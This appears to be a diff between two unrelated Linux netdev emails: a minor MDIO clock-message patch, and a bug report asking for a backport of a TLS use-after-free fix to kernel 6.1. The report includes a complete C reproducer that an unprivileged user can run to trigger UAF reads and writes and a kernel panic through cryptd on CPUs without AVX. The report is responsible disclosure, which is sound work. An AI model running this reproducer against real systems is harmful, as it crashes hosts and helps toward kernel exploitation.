@@ -1,104 +1,203 @@
-Return-Path: <netdev+bounces-212544-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-212543-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 50055B212DE
-	for <lists+netdev@lfdr.de>; Mon, 11 Aug 2025 19:09:14 +0200 (CEST)
+Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [IPv6:2604:1380:4601:e00::3])
+	by mail.lfdr.de (Postfix) with ESMTPS id EEF11B212C2
+	for <lists+netdev@lfdr.de>; Mon, 11 Aug 2025 19:04:10 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 0F39F620CA0
-	for <lists+netdev@lfdr.de>; Mon, 11 Aug 2025 17:09:13 +0000 (UTC)
+	by am.mirrors.kernel.org (Postfix) with ESMTPS id 02A451907C9B
+	for <lists+netdev@lfdr.de>; Mon, 11 Aug 2025 17:04:30 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id EF5212C21E0;
-	Mon, 11 Aug 2025 17:09:08 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id EEC432C21EF;
+	Mon, 11 Aug 2025 17:03:55 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=broadcom.com header.i=@broadcom.com header.b="T87r1Esh"
+	dkim=pass (2048-bit key) header.d=willsroot.io header.i=@willsroot.io header.b="P7khkwGU"
 X-Original-To: netdev@vger.kernel.org
-Received: from relay.smtp-ext.broadcom.com (relay.smtp-ext.broadcom.com [192.19.144.205])
+Received: from mail-10625.protonmail.ch (mail-10625.protonmail.ch [79.135.106.25])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 663B029BDAA;
-	Mon, 11 Aug 2025 17:09:07 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=192.19.144.205
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 00D1A29BDB3
+	for <netdev@vger.kernel.org>; Mon, 11 Aug 2025 17:03:53 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=79.135.106.25
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1754932148; cv=none; b=BD5qoz9s44xSrY1GPtxRltmNyXe4i22fbCTRZQS0PPMTiNVwRYkMNNuSqhPPbV7NwEUapcn5Zs7gUNedUACC+B2qNGU3maD9Vuu5PY5HnT6342GLssU+Qjs1a3C5W4iht7Di+oxyB+h8Iq+mfdtwqLyW9qBYZITmy1umEUA7hL8=
+	t=1754931835; cv=none; b=l9uLKOf4zBKswEs6XlVO+44TXw686k7mZ2uQWtG8Rnn5wSk8vr7WuHAxNi3xRwlFkPhjz1iggWlMN1J3klfRGyaBXHT/Z12p+Bohxolh8BySva5PocTY5p1sdG+Fst9zvy+cwTV76oRHPjOf8eHBG6OCB/52ZEDPVnZcBbLjLN4=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1754932148; c=relaxed/simple;
-	bh=xYofdvRO7j1Ase2qXJ0tdVFtD+PZbY32/7zmF+57inc=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=J+jnb2HdtPDQ4+qFXmZtxJlwZwQj2zaq1PmabngTVv2chYn6XRdkaIskJrTsbTXrFW/I6w301yhCXUSR7csfq43NKiX9ETJ0MnciDZCn2RXflOc7GKdr68BGw/cApe1Fgo/XqWcXB2mKhbii7pu5wRihGcNm6gsdZw3s3m5GWIc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=broadcom.com; spf=fail smtp.mailfrom=broadcom.com; dkim=pass (1024-bit key) header.d=broadcom.com header.i=@broadcom.com header.b=T87r1Esh; arc=none smtp.client-ip=192.19.144.205
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=broadcom.com
-Authentication-Results: smtp.subspace.kernel.org; spf=fail smtp.mailfrom=broadcom.com
-Received: from mail-lvn-it-01.broadcom.com (mail-lvn-it-01.lvn.broadcom.net [10.36.132.253])
-	by relay.smtp-ext.broadcom.com (Postfix) with ESMTP id 37CAAC0005CB;
-	Mon, 11 Aug 2025 09:59:54 -0700 (PDT)
-DKIM-Filter: OpenDKIM Filter v2.11.0 relay.smtp-ext.broadcom.com 37CAAC0005CB
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=broadcom.com;
-	s=dkimrelay; t=1754931594;
-	bh=xYofdvRO7j1Ase2qXJ0tdVFtD+PZbY32/7zmF+57inc=;
-	h=From:To:Cc:Subject:Date:From;
-	b=T87r1Eshs7/fCvDSzxx3dSIQSKQ2JWNa63ipEz1BPorQTizrxV0T+b7QhWF4sukHx
-	 oYOf4PIoe6GCI6tqLfZ3YzD9bwdbu9rzh7sFOkMJyJrl9Pd8kLgDdBuWN3CXkj5qIr
-	 FC2t66abBZGHgQyY6p+ElOf0LPuJ24jimlufjLls=
-Received: from fainelli-desktop.igp.broadcom.net (fainelli-desktop.dhcp.broadcom.net [10.67.48.245])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
-	(No client certificate requested)
-	by mail-lvn-it-01.broadcom.com (Postfix) with ESMTPSA id C1BBD18000A5F;
-	Mon, 11 Aug 2025 09:59:23 -0700 (PDT)
-From: Florian Fainelli <florian.fainelli@broadcom.com>
-To: netdev@vger.kernel.org
-Cc: Florian Fainelli <florian.fainelli@broadcom.com>,
-	Doug Berger <opendmb@gmail.com>,
-	Broadcom internal kernel review list <bcm-kernel-feedback-list@broadcom.com>,
-	Andrew Lunn <andrew@lunn.ch>,
-	Heiner Kallweit <hkallweit1@gmail.com>,
-	Russell King <linux@armlinux.org.uk>,
-	"David S. Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>,
-	Paolo Abeni <pabeni@redhat.com>,
-	linux-kernel@vger.kernel.org (open list)
-Subject: [PATCH net-next] net: mdio: mdio-bcm-unimac: Refine incorrect clock message
-Date: Mon, 11 Aug 2025 09:59:21 -0700
-Message-ID: <20250811165921.392030-1-florian.fainelli@broadcom.com>
-X-Mailer: git-send-email 2.43.0
+	s=arc-20240116; t=1754931835; c=relaxed/simple;
+	bh=7cUKkyYHTauJlJoSDm7aQ6chUaavvGuupfo85YrXibM=;
+	h=Date:To:From:Cc:Subject:Message-ID:MIME-Version:Content-Type; b=nQYd5aOzJX6jEm5vwpuKjnTC0v/PGAB82lqhv60RYjBKa2bc6B/xHag44eOKz0BiXR0On5RvNWO7uWbP5T5+kuOKLR0uKw0J1qJ1ZpwluPS9fhNgcEZnrSRWNLvLMOWv7hk5FTNds61YA9kzWalofTyw+mKnVhEhtmfYEFQcsVA=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=willsroot.io; spf=pass smtp.mailfrom=willsroot.io; dkim=pass (2048-bit key) header.d=willsroot.io header.i=@willsroot.io header.b=P7khkwGU; arc=none smtp.client-ip=79.135.106.25
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=willsroot.io
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=willsroot.io
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=willsroot.io;
+	s=protonmail2; t=1754931831; x=1755191031;
+	bh=HT42lsSm+IZ/cej5rhvGMCIS35tYGM41VbPIooh0P6c=;
+	h=Date:To:From:Cc:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
+	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector;
+	b=P7khkwGUIh6ZWyzdGyKgnt+68umFQs7P9CjR9YiK5NcGf4jCEr5sudEr1EB39NpBK
+	 roiyvbd4RfiTbT3Hqm1O4ZizL/qVr8GDn4OIUaAEB42RwfRGqJRk4b5CFfMistIaYs
+	 mWyLlx3GuyLhoQy1hOBKVHQT9yNsxktplLsK6YqXvD4TKcHrh1ig+gJ+1KIg1aPsQu
+	 1wEW6WPqpGH+2GNUlfBDPWsOeaAXD0cCbjSpuGLU+maCjXDa4iKrmpcfL4J+D6q2iM
+	 26IFXxjvBvc7cN4dzA9zqDFKd3LTgHvNP6HzQrg0VVZMA2PwWUeaWTG+HjnUgybT8g
+	 Bk2wHD7m9JRGA==
+Date: Mon, 11 Aug 2025 17:03:47 +0000
+To: "stable@vger.kernel.org" <stable@vger.kernel.org>
+From: William Liu <will@willsroot.io>
+Cc: "sd@queasysnail.net" <sd@queasysnail.net>, Jakub Kicinski <kuba@kernel.org>, "netdev@vger.kernel.org" <netdev@vger.kernel.org>, Savy <savy@syst3mfailure.io>, "john.fastabend@gmail.com" <john.fastabend@gmail.com>, "borisp@nvidia.com" <borisp@nvidia.com>
+Subject: [BUG] Missing backport for UAF fix in interaction between tls_decrypt_sg and cryptd_queue_worker
+Message-ID: <he2K1yz_u7bZ-CnYcTSQ4OxuLuHZXN6xZRgp6_ICSWnq8J5FpI_uD1i_1lTSf7WMrYb5ThiX1OR2GTOB2IltgT49Koy7Hhutr4du4KtLvyk=@willsroot.io>
+Feedback-ID: 42723359:user:proton
+X-Pm-Message-ID: d0069bd53d5739e83984cc5f94c0b732173af8b5
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
 
-In light of a81649a4efd3 ("net: mdio: mdio-bcm-unimac: Correct rate
-fallback logic"), it became clear that the warning should be specific to
-the MDIO controller instance, and there should be further information
-provided to indicate what is wrong, whether the requested clock
-frequency or the rate calculation. Clarify the message accordingly.
+Hi all,
 
-Signed-off-by: Florian Fainelli <florian.fainelli@broadcom.com>
----
- drivers/net/mdio/mdio-bcm-unimac.c | 4 +++-
- 1 file changed, 3 insertions(+), 1 deletion(-)
+Commit 41532b785e (tls: separate no-async decryption request handling from =
+async) [1] actually covers a UAF read and write bug in the kernel, and shou=
+ld be backported to 6.1. As of now, it has only been backported to 6.6, bac=
+k from the time when the patch was committed. The commit mentions a non-rep=
+roducible UAF that was previously observed, but we managed to hit the vulne=
+rable case.
 
-diff --git a/drivers/net/mdio/mdio-bcm-unimac.c b/drivers/net/mdio/mdio-bcm-unimac.c
-index 7baab230008a..37e35f282d9a 100644
---- a/drivers/net/mdio/mdio-bcm-unimac.c
-+++ b/drivers/net/mdio/mdio-bcm-unimac.c
-@@ -215,7 +215,9 @@ static int unimac_mdio_clk_set(struct unimac_mdio_priv *priv)
- 
- 	div = (rate / (2 * priv->clk_freq)) - 1;
- 	if (div & ~MDIO_CLK_DIV_MASK) {
--		pr_warn("Incorrect MDIO clock frequency, ignoring\n");
-+		dev_warn(priv->mii_bus->parent,
-+			 "Ignoring MDIO clock frequency request: %d vs. rate: %ld\n",
-+			 priv->clk_freq, rate);
- 		ret = 0;
- 		goto out;
- 	}
--- 
-2.43.0
+The vulnerable case is when a user wraps an existing crypto algorithm (such=
+ as gcm or ghash) in cryptd. By default, cryptd-wrapped algorithms have a h=
+igher priority than the base variant. tls_decrypt_sg allocates the aead req=
+uest, and triggers the crypto handling with tls_do_decryption. When the cry=
+pto is handled by cryptd, it gets dispatched to a worker that handles it an=
+d initially returns EINPROGRESS. While older LTS versions (5.4, 5.10, and 5=
+.15) seem to have an additional crypto_wait_req call in those cases, 6.1 ju=
+st returns success and frees the aead request. The cryptd worker could stil=
+l be operating in this case, which causes a UAF.=20
 
+However, this vulnerability only occurs when the CPU is without AVX support=
+ (perhaps this is why there were reproducibility difficulties). With AVX, a=
+esni_init calls simd_register_aeads_compat to force the crypto subsystem to=
+ use the SIMD version and avoids the async issues raised by cryptd. While I=
+ doubt many people are using host systems without AVX these days, this envi=
+ronment is pretty common in VMs when QEMU uses KVM without using the "-cpu =
+host" flag.
+
+The following is a repro, and can be triggered from unprivileged users. Mul=
+tishot KASAN shows multiple UAF reads and writes, and ends up panicking the=
+ system with a null dereference.
+
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <string.h>
+#include <unistd.h>
+#include <sched.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <linux/tcp.h>
+#include <linux/tls.h>
+#include <sys/resource.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <linux/if_alg.h>
+#include <signal.h>
+#include <sys/wait.h>
+#include <time.h>
+
+struct tls_conn {
+    int tx;
+    int rx;
+};
+
+void tls_enable(int sk, int type) {
+    struct tls12_crypto_info_aes_gcm_256 tls_ci =3D {
+        .info.version =3D TLS_1_3_VERSION,
+        .info.cipher_type =3D TLS_CIPHER_AES_GCM_256,
+    };
+
+    setsockopt(sk, IPPROTO_TCP, TCP_ULP, "tls", sizeof("tls"));
+    setsockopt(sk, SOL_TLS, type, &tls_ci, sizeof(tls_ci));
+}
+
+struct tls_conn *tls_create_conn(int port) {
+    int s0 =3D socket(AF_INET, SOCK_STREAM, 0);
+    int s1 =3D socket(AF_INET, SOCK_STREAM, 0);
+
+    struct sockaddr_in a =3D {
+        .sin_family =3D AF_INET,
+        .sin_port =3D htons(port),
+        .sin_addr =3D htobe32(0),
+    };
+
+    bind(s0, (struct sockaddr*)&a, sizeof(a));
+    listen(s0, 1);
+    connect(s1, (struct sockaddr *)&a, sizeof(a));
+    int s2 =3D accept(s0, 0, 0);
+    close(s0);
+   =20
+    tls_enable(s1, TLS_TX);
+    tls_enable(s2, TLS_RX);
+
+    struct tls_conn *t =3D calloc(1, sizeof(struct tls_conn));
+
+    t->tx =3D s1;
+    t->rx =3D s2;
+
+    return t;
+}
+
+void tls_destroy_conn(struct tls_conn *t) {
+    close(t->tx);
+    close(t->rx);
+    free(t);
+}
+
+int tls_send(struct tls_conn *t, char *data, size_t size) {
+    return sendto(t->tx, data, size, 0, NULL, 0);
+}
+
+int tls_recv(struct tls_conn *t, char *data, size_t size) {
+    return recvfrom(t->rx, data, size, 0, NULL, NULL);
+}
+
+int crypto_register_algo(char *type, char *name) {
+   =20
+    int s =3D socket(AF_ALG, SOCK_SEQPACKET, 0);
+
+    struct sockaddr_alg sa =3D {};
+
+    sa.salg_family =3D AF_ALG;
+    strcpy(sa.salg_type, type);
+    strcpy(sa.salg_name, name);
+
+    bind(s, (struct sockaddr *)&sa, sizeof(sa));
+    close(s);
+   =20
+    return 0;
+}
+
+int main(void) {
+    char buff[0x2000];
+    crypto_register_algo("aead", "cryptd(gcm(aes))");
+    struct tls_conn *t =3D tls_create_conn(20000);
+    tls_send(t, buff, 0x10);
+    tls_recv(t, buff, 0x100);
+}
+
+Feel free to let us know if you have any questions and if there is anything=
+ else we can do to help.
+
+Best,
+Will
+Savy
+
+[1] https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/comm=
+it/?id=3D41532b785e9d79636b3815a64ddf6a096647d011
 
